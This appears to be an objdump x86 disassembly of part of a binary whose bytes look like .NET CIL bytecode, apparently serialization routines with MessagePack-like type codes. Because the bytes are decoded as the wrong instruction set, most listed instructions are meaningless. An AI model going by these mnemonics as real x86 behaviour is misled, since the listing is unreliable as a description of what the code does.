  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
